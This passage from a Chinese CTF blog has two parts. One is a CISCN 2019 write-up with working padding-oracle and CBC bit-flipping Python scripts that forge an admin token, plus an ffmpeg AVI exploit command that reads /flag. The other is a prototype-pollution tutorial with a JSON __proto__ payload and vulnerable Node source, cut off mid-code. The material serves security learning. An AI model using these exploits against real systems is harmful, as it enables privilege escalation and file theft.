href="#PointSystem-PaddingOracle-cbc翻转" class="headerlink" title="PointSystem(PaddingOracle+cbc翻转)"></a>PointSystem(PaddingOracle+cbc翻转)</h1><p>题目难度挺大的，前后还拖了不少时间，最后参考了出题人赵师傅的wp才勉强写出来的。其中涉及PaddingOracle+CBC翻转攻击的知识涉及密码学，自己所知甚少，原来也只套过脚本做过一道paddingoracle的题目。所以先把解题过程放一下，抽空把padding oracle等等加密原理理解下。</p><p>首先题目从robots.txt中获取信息，进入<code>swagger-ui.html</code>，可以看到有许多api接口的使用。<img src="/2020/02/19/CISCN-2019-web%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/8.PNG" alt="api"><br>一开始尝试能否直接在这个界面进行命令执行，比如注册或者ping之类的。但是发现并不可行。不过我们既然知道有注册接口，直接按照格式利用接口注册一个账号就好了。<br>注册后尝试登录，却意外发现存在权限不够的问题。</p><p><img src="/2020/02/19/CISCN-2019-web%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/9.PNG" alt="权限"><br>但是在burpsuite中意外发现了除了一个登录的post包，还有一个get请求了未知的api并返回信息。<br><img src="/2020/02/19/CISCN-2019-web%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/10.PNG" alt="info"><br>将登录所返回的一段base64进行解码得到：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"signed_key"</span>:<span class="string">"SUN4a1NpbmdEYW5jZVJhUHsFQR4ln5VFC9L09echkYhTWQgiwZohj27JWt98/+1ZOzOMzVHlzkkVTuw8vkgQOwMZ2B5Leaq0Gc+rzoKtQdjsiMrpsSBq/QvWKTHYKxBHN0JzlQd6bXhFdSUa4slA7g=="</span>,<span class="attr">"role"</span>:<span class="number">3</span>,<span class="attr">"user_id"</span>:<span class="number">1</span>,<span class="attr">"payload"</span>:<span class="string">"CHAkpjTggDemZY7gzXBvbR2WeXJ47cfj"</span>,<span class="attr">"expire_in"</span>:<span class="number">1582905111</span>&#125;</span><br></pre></td></tr></table></figure><p>而前面的<code>signed_key</code>也进行base64解码的话，会发现内容由明文+密文组合起来了。说明有可能服务器采取cbc模式加密。我们要做的就是paddingoracle破解出结构并cbc翻转一下。<br>padding oracleexp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">host = <span class="string">"d46d6658-3bdd-48d9-8600-ee320a2a837a.node3.buuoj.cn"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">padding_oracle</span><span class="params">(key)</span>:</span></span><br><span class="line">    user_key_decode = base64.b64decode(key)</span><br><span class="line">    user_key_json_decode = json.loads(user_key_decode)</span><br><span class="line">    signed_key = user_key_json_decode[<span class="string">'signed_key'</span>]</span><br><span class="line">    signed_key_decoded = base64.b64decode(signed_key)</span><br><span class="line">    url = <span class="string">"http://"</span> + host + <span class="string">"/frontend/api/v1/user/info"</span></span><br><span class="line"></span><br><span class="line">    N = <span class="number">16</span></span><br><span class="line"></span><br><span class="line">    total_plain = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> block <span class="keyword">in</span> range(<span class="number">0</span>, len(signed_key_decoded) // <span class="number">16</span> - <span class="number">1</span>):</span><br><span class="line">        print(block)</span><br><span class="line">        token = <span class="string">''</span></span><br><span class="line">        get = <span class="string">b""</span></span><br><span class="line">        cipher = signed_key_decoded[<span class="number">16</span> + block * <span class="number">16</span>:<span class="number">32</span> + block * <span class="number">16</span>]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, N+<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">256</span>):</span><br><span class="line">                time.sleep(<span class="number">0.2</span>)</span><br><span class="line">                padding = <span class="string">b""</span>.join([(get[n] ^ i).to_bytes(<span class="number">1</span>, <span class="string">'little'</span>) <span class="keyword">for</span> n <span class="keyword">in</span> range(len(get))])</span><br><span class="line">                c = <span class="string">b'\x00'</span> * (<span class="number">16</span> - i) + j.to_bytes(<span class="number">1</span>, <span class="string">'little'</span>) + padding + cipher</span><br><span class="line">                <span class="comment">#print(c)</span></span><br><span class="line">                token = base64.b64encode(c)</span><br><span class="line">                user_key_json_decode[<span class="string">'signed_key'</span>] = token.decode(<span class="string">"utf-8"</span>)</span><br><span class="line">                header = &#123;<span class="string">'Key'</span>: base64.b64encode(bytes(json.dumps(user_key_json_decode), <span class="string">"utf-8"</span>))&#125;</span><br><span class="line">                res = requests.get(url, headers=header)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">'少女'</span> <span class="keyword">in</span> res.text:</span><br><span class="line">                    print(<span class="string">'404 error occured!'</span>)</span><br><span class="line">                    time.sleep(<span class="number">15.0</span>)</span><br><span class="line">                    res = requests.get(url, headers=header)</span><br><span class="line">                <span class="keyword">if</span> res.json()[<span class="string">'code'</span>] == <span class="number">206</span>:</span><br><span class="line">                    get = (j ^ i).to_bytes(<span class="number">1</span>, <span class="string">'little'</span>) + get</span><br><span class="line">                    print(i,get)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        plain = <span class="string">b""</span>.join([(get[i] ^ signed_key_decoded[block * <span class="number">16</span> + i]).to_bytes(<span class="number">1</span>, <span class="string">'little'</span>) <span class="keyword">for</span> i <span class="keyword">in</span> range(N)])</span><br><span class="line">        print(plain.decode(<span class="string">"utf-8"</span>), <span class="string">"block=%d"</span> % block)</span><br><span class="line">        total_plain += plain.decode(<span class="string">"utf-8"</span>)</span><br><span class="line">        print(total_plain)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> total_plain</span><br><span class="line"></span><br><span class="line">plain_text = padding_oracle(<span class="string">"eyJzaWduZWRfa2V5IjoiU1VONGExTnBibWRFWVc1alpWSmhVSHNGUVI0bG41VkZDOUwwOWVjaGtZaEVqZjRGRjhTQVV5VjVmS3RqbGhuY2lZV3YrYW9NZi9EV2hvU1laaVFpWTJkanlpV1hJbGNqM2FRTndmajdLNnpvZGwzcUhsb2lPakdxWGhCRTN6UHVTeDMwY2lPdlpMZm5ya2tDZ0ZWRXFRPT0iLCJyb2xlIjozLCJ1c2VyX2lkIjoyLCJwYXlsb2FkIjoic3c4SHByRENncFJHRWZwYzMxY29KME1DR1NkRm90SlgiLCJleHBpcmVfaW4iOjE1ODI5ODYwODB9"</span>)</span><br><span class="line">print(plain_text)</span><br></pre></td></tr></table></figure><p>由于padding需要频繁请求服务器，buu的靶机期间经常出现404。所以我得在每次出现404时sleep十多秒……太难了，跑了快几小时才好。跑完后得到明文结构</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"role"</span>:<span class="number">3</span>,<span class="attr">"user_id"</span>:<span class="number">2</span>,<span class="attr">"payload"</span>:<span class="string">"sw8HprDCgpRGEfpc31coJ0MCGSdFotJX"</span>,<span class="attr">"expire_in"</span>:<span class="number">1582986080</span>&#125;</span><br></pre></td></tr></table></figure><p>既然如此，把role改为1应该就可以解决权限问题。所以cbc翻转下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">host = <span class="string">"d46d6658-3bdd-48d9-8600-ee320a2a837a.node3.buuoj.cn"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cbc_attack</span><span class="params">(key, block, origin_content, target_content)</span>:</span></span><br><span class="line">    user_key_decode = base64.b64decode(key)</span><br><span class="line">    <span class="comment">#print(user_key_decode)</span></span><br><span class="line">    user_key_json_decode = json.loads(user_key_decode)</span><br><span class="line">    signed_key = user_key_json_decode[<span class="string">'signed_key'</span>]</span><br><span class="line">    <span class="comment">#print(signed_key)</span></span><br><span class="line">    cipher_o = base64.b64decode(signed_key)</span><br><span class="line">    <span class="comment">#print(cipher_o)</span></span><br><span class="line">    <span class="keyword">if</span> block &gt; <span class="number">0</span>:</span><br><span class="line">        iv_prefix = cipher_o[:block * <span class="number">16</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        iv_prefix = <span class="string">b''</span></span><br><span class="line">    iv = cipher_o[block * <span class="number">16</span>:<span class="number">16</span> + block * <span class="number">16</span>]</span><br><span class="line">    cipher = cipher_o[<span class="number">16</span> + block * <span class="number">16</span>:]</span><br><span class="line">    iv_array = bytearray(iv)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">16</span>):</span><br><span class="line">        iv_array[i] = iv_array[i] ^ ord(origin_content[i]) ^ ord(target_content[i])</span><br><span class="line">    iv = bytes(iv_array)</span><br><span class="line">    <span class="comment">#print(iv)</span></span><br><span class="line">    user_key_json_decode[<span class="string">'signed_key'</span>] = base64.b64encode(iv_prefix + iv + cipher).decode(<span class="string">'utf-8'</span>)</span><br><span class="line">    <span class="keyword">return</span> base64.b64encode(bytes(json.dumps(user_key_json_decode), <span class="string">"utf-8"</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_user_info</span><span class="params">(key)</span>:</span></span><br><span class="line">    r = requests.post(<span class="string">"http://"</span> + host +<span class="string">"/frontend/api/v1/user/info"</span>, headers=&#123;<span class="string">"Key"</span>: key&#125;)</span><br><span class="line">    <span class="keyword">if</span> r.json()[<span class="string">'code'</span>] == <span class="number">100</span>:</span><br><span class="line">        print(<span class="string">"获取成功！"</span>)</span><br><span class="line">    <span class="comment">#return r.json()['data']</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">modify_role_plain</span><span class="params">(key, role)</span>:</span></span><br><span class="line">    user_key_decode = base64.b64decode(user_key)</span><br><span class="line">    user_key_json_decode = json.loads(user_key_decode)</span><br><span class="line">    user_key_json_decode[<span class="string">'role'</span>] = role</span><br><span class="line">    <span class="keyword">return</span> base64.b64encode(bytes(json.dumps(user_key_json_decode), <span class="string">'utf-8'</span>)).decode(<span class="string">'utf-8'</span>)</span><br><span class="line"></span><br><span class="line">print(<span class="string">"翻转 Key:"</span>)</span><br><span class="line">user_key = cbc_attack(<span class="string">"eyJzaWduZWRfa2V5IjoiU1VONGExTnBibWRFWVc1alpWSmhVSHNGUVI0bG41VkZDOUwwOWVjaGtZaEVqZjRGRjhTQVV5VjVmS3RqbGhuY0JWN1BLdlJ2UVlGdVUydlppRXRKYlV0NkJWZGRlZUp0Rll2Nnl4dmxpaVhYMTdEcVZ6WXJjVjJEeTloekpaM29Gcm9yV0hUWDh0T2N0bjFITXFSSlBnPT0iLCJyb2xlIjozLCJ1c2VyX2lkIjoyLCJwYXlsb2FkIjoidjByeEZqT2NJZW0xYzNta3o5Q2VINXZYdWxuZ0pES3AiLCJleHBpcmVfaW4iOjE1ODI5OTU2NDh9"</span>, <span class="number">0</span>, <span class="string">'&#123;"role":3,"user_'</span>, <span class="string">'&#123;"role":1,"user_'</span>)</span><br><span class="line">user_key = modify_role_plain(user_key, <span class="number">1</span>)</span><br><span class="line">print(user_key)</span><br><span class="line">print(<span class="string">"测试拉取用户信息："</span>)</span><br><span class="line">user_info = get_user_info(user_key)</span><br><span class="line">print(user_info)</span><br></pre></td></tr></table></figure><p>如果测试的返回没有问题的话，我们就可以直接拿payload修改为cookie登录了。实际上页面源码中会提示，预设一个值为Key的cookie,所以我们直接添加Key值cookie,成功登陆。<br>最后就是一个misc型题目了……后台唯一比较有意思 的是视频上传功能，而随便上传后再下下来我们的上传视频，会发现视频的MD5值发生改变。说明可能服务器对视频处理过了。这里赵师傅设计的是ffmpeg对视频处理。所以可找能处理ffmpeg漏洞的脚本<br><a href="https://github.com/neex/ffmpeg-avi-m3u-xbin/" target="_blank" rel="noopener">https://github.com/neex/ffmpeg-avi-m3u-xbin/</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python gen_xbin_avi.py file:&#x2F;&#x2F;&#x2F;flag test.avi</span><br></pre></td></tr></table></figure><p>上传后再下下来，第一帧就有flag了。<br><img src="/2020/02/19/CISCN-2019-web%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/11.PNG" alt="flag"></p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WEB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>从杭电hgame-week4学原型链污染</title>
      <link href="2020/02/18/%E4%BB%8E%E6%9D%AD%E7%94%B5hgame-week4%E5%AD%A6%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/"/>
      <url>2020/02/18/%E4%BB%8E%E6%9D%AD%E7%94%B5hgame-week4%E5%AD%A6%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/</url>
      
        <content type="html"><![CDATA[<p>因为数模导致本来不打算做week4的题目的，不过当时瞅了一眼sekiro这道题并且看出来是原型链污染(也有叫Node.js污染,javasrcipt原型链污染的)。可惜当时没做过，没深入也没做出来。今天抽空看了下wp才明白。干脆把当时查阅资料学到的知识总结下。</p><p>时间线上看，国内最早出现的原型链污染题目应该是出自P牛代码审计知识星球的hard-the js。整体上算比较新的洞。在各种比赛出现频次一般，原因有很多，这点之后再谈。其主要是前端形式的攻击，而且涉及到javascript知识更多些，因此还是要从javascript的角度学习下：</p><a id="more"></a><h1 id="原型链"><a href="#原型链" class="headerlink" title="原型链"></a>原型链</h1><p>经常有这样一种说法：javascript中万物皆对象。这个说法严格来讲不准确，但是却体现了js语法及使用上的特性。javaScript中的对象其实就是一些键值对的集合，每一个键值对叫做一个属性，比如：<br><img src="/2020/02/18/%E4%BB%8E%E6%9D%AD%E7%94%B5hgame-week4%E5%AD%A6%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/1.PNG" alt="属性"><br>此时对象obj就有了<code>name</code>与<code>website</code>两个属性。但其实其输出内容并不只有这两个，完整输出的如下：<br><img src="/2020/02/18/%E4%BB%8E%E6%9D%AD%E7%94%B5hgame-week4%E5%AD%A6%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/2.PNG" alt="__proto__"><br>可以看到，输出属性中出现了<code>proto</code>以及<code>constructor</code>这样的字眼，那他们到底是什么呢？这要提到js继承的概念，继承的整个过程就称为该类的原型链。<br>从刚刚的例子可以看到，从obj的<code>__proto__</code>中能明白其父类是Object.(Constructor返回用于创建这个对象的函数)，同时还有许多其他函数。</p><p>对于类，有一个与之相对应的属性，叫做<code>prototype</code>。且二者等价。比如下面这个p牛的经典例子<br><img src="/2020/02/18/%E4%BB%8E%E6%9D%AD%E7%94%B5hgame-week4%E5%AD%A6%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/3.PNG" alt="proto与prototype"></p><p>从类的角度讲，<code>prototype</code>是其一个属性，所有类实例化的对象，都将拥有这个属性中的所有内容，包括变量和方法。但是类所实例化的对象并不能通过prototype访问原型，所以才有<code>__proto__</code><br>出现，且一个对象的<strong>proto</strong>属性，指向这个对象所在的类的prototype属性。</p><h1 id="原型链污染"><a href="#原型链污染" class="headerlink" title="原型链污染"></a>原型链污染</h1><p>而原型链的特性决定了其在js继承中的重要之处。而其特性表现在，在我们调用一个对象的某一属性时：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.对象(obj)中寻找这一属性</span><br><span class="line">2.如果找不到，则在obj.__proto__中寻找属性</span><br><span class="line">3.如果仍然找不到，则继续在obj.__proto__.__proto__中寻找这一属性</span><br></pre></td></tr></table></figure><p>以上机制被称为js的prototype继承链。而原型链污染就与这有关</p><p>比如以下代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> foo = &#123;<span class="attr">bar</span>: <span class="number">1</span>&#125;</span><br><span class="line"><span class="built_in">console</span>.log(foo.bar)</span><br><span class="line">foo.__proto__.bar = <span class="number">2</span></span><br><span class="line"><span class="built_in">console</span>.log(foo.bar)</span><br><span class="line"><span class="keyword">let</span> zoo = &#123;&#125;</span><br><span class="line"><span class="built_in">console</span>.log(zoo.bar)</span><br></pre></td></tr></table></figure><p>结果为<img src="/2020/02/18/%E4%BB%8E%E6%9D%AD%E7%94%B5hgame-week4%E5%AD%A6%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/4.PNG" alt="污染"><br>可以发现，在我们通过<code>__proto__</code>修改bar值后，再度实例化一个新的对象时，其bar值从1变为了2。原因如下：前面修改foo的原型<code>foo.__proto__.bar = 2</code>，而foo是一个Object类的实例，所以实际上是修改了Object这个类，给这个类增加了一个属性bar，值为2.<br>那么后面我们zoo相当于是实例化了一个Object类，自然有属性bar=2.</p><p>所以原型链污染定义如下：</p><blockquote><p>如果攻击者控制并修改了一个对象的原型，那么将可以影响所有和这个对象来自同一个类、父祖类的对象。这种攻击方式就是原型链污染</p></blockquote><h1 id="使用场景"><a href="#使用场景" class="headerlink" title="使用场景"></a>使用场景</h1><p>原型链污染的使用场景我也不熟，但是目前根据题目出现的情况，主要与这两个函数有关</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">merge()</span><br><span class="line">clone()</span><br></pre></td></tr></table></figure><p>常用源码如下,可以看出clone与merge并无本质区别：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> merge = <span class="function">(<span class="params">a, b</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> attr <span class="keyword">in</span> b) &#123;</span><br><span class="line">    <span class="keyword">if</span> (isObject(a[attr]) &amp;&amp; isObject(b[attr])) &#123;</span><br><span class="line">      merge(a[attr], b[attr]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      a[attr] = b[attr];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> a</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> clone = <span class="function">(<span class="params">a</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> merge(&#123;&#125;, a);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>本质上这两个函数会有风险，就是因为存在能够控制数组（对象）的“键名”的操作。<br>但是要想实现原型链污染，光只要键名可控是不够的。以下面这个例子为参考：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">merge</span>(<span class="params">target, source</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> source) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key <span class="keyword">in</span> source &amp;&amp; key <span class="keyword">in</span> target) &#123;</span><br><span class="line">            merge(target[key], source[key])</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            target[key] = source[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>尝试把第二个键名设为<code>__proto__</code>并赋值b为2。看看能不能把object的属性b改为2。<br><img src="/2020/02/18/%E4%BB%8E%E6%9D%AD%E7%94%B5hgame-week4%E5%AD%A6%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/5.PNG" alt="污染失败"><br>可以看见最后<code>o3.b</code>返回的是<code>undefined</code>,并没有污染成功。<br>主要原因就是因为<code>__proto__</code>没有被认为是一个键名。而这就需要我上面提到的另一个条件,代码如下时：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> o1 = &#123;&#125;</span><br><span class="line"><span class="keyword">let</span> o2 = <span class="built_in">JSON</span>.parse(<span class="string">'&#123;"a": 1, "__proto__": &#123;"b": 2&#125;&#125;'</span>)</span><br><span class="line">merge(o1, o2)</span><br><span class="line"><span class="built_in">console</span>.log(o1.a, o1.b)</span><br><span class="line"></span><br><span class="line">o3 = &#123;&#125;</span><br><span class="line"><span class="built_in">console</span>.log(o3.b)</span><br></pre></td></tr></table></figure><p>如果存在<code>JSON.parse()</code>，就能成功把<code>__proto__</code>解析成键名了。<br><img src="/2020/02/18/%E4%BB%8E%E6%9D%AD%E7%94%B5hgame-week4%E5%AD%A6%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/6.PNG" alt="污染成功"></p><p>有了这些基础，就基本能了解原型链污染的原理了。</p><h1 id="真题"><a href="#真题" class="headerlink" title="真题"></a>真题</h1><h2 id="hgame-sekiro"><a href="#hgame-sekiro" class="headerlink" title="hgame sekiro"></a>hgame sekiro</h2><p>回头来看hgame中sekiro这道题，题目给出的关键源码主要在一下两个js文件中<br>route/index.js</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>);</span><br><span class="line"><span class="keyword">var</span> router = express.Router();</span><br><span class="line"><span class="keyword">var</span> game = <span class="built_in">require</span>(<span class="string">'../utils/index'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> isObject = <span class="function"><span class="params">obj</span> =&gt;</span> obj &amp;&amp; obj.constructor &amp;&amp; obj.constructor === <span class="built_in">Object</span>;</span><br><span class="line"><span class="keyword">const</span> merge = <span class="function">(<span class="params">a, b</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> attr <span class="keyword">in</span> b) &#123;</span><br><span class="line">    <span class="keyword">if</span> (isObject(a[attr]) &amp;&amp; isObject(b[attr])) &#123;</span><br><span class="line">      merge(a[attr], b[attr]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      a[attr] = b[attr];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> a</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> clone = <span class="function">(<span class="params">a</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> merge(&#123;&#125;, a);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> Game = <span class="keyword">new</span> game();</span><br><span class="line"></span><br><span class="line">router.get(<span class="string">'/'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  res.render(<span class="string">'index'</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">router.post(<span class="string">'/action'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (!req.session.sekiro) &#123;</span><br><span class="line">    res.end(<span class="string">"Session required."</span>)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (!req.session.sekiro.alive) &#123;</span><br><span class="line">    res.end(<span class="string">"You dead."</span>)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">var</span> body = <span class="built_in">JSON</span>.parse(<span class="built_in">JSON</span>.stringify(req.body));</span><br><span class="line">  <span class="keyword">var</span> copybody = clone(body)</span><br><span class="line">  <span class="keyword">if</span> (copybody.solution) &#123;</span><br><span class="line">    req.session.sekiro = Game.dealWithAttacks(req.session.sekiro, copybody.solution)</span><br><span class="line">  &#125;</span><br><span class="line">  res.end(<span class="string">"提交成功"</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">router.get(<span class="string">'/attack'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (!req.session.sekiro) &#123;</span><br><span class="line">    res.end(<span class="string">"Session required."</span>)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (!req.session.sekiro.alive) &#123;</span><br><span class="line">    res.end(<span class="string">"You dead."</span>)</span><br><span class="line">  &#125;</span><br><span class="line">  req.session.sekiro.attackInfo = Game.getAttackInfo()</span><br><span class="line">  res.end(req.session.sekiro.attackInfo.method)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">router.get(<span class="string">'/info'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">typeof</span>(req.query.restart) != <span class="string">"undefined"</span> || !req.session.sekiro) &#123;</span><br><span class="line">    req.session.sekiro = &#123; <span class="string">"health"</span>: <span class="number">3000</span>, <span class="attr">posture</span>: <span class="number">0</span>, <span class="attr">alive</span>: <span class="literal">true</span> &#125;</span><br><span class="line">  &#125;</span><br><span 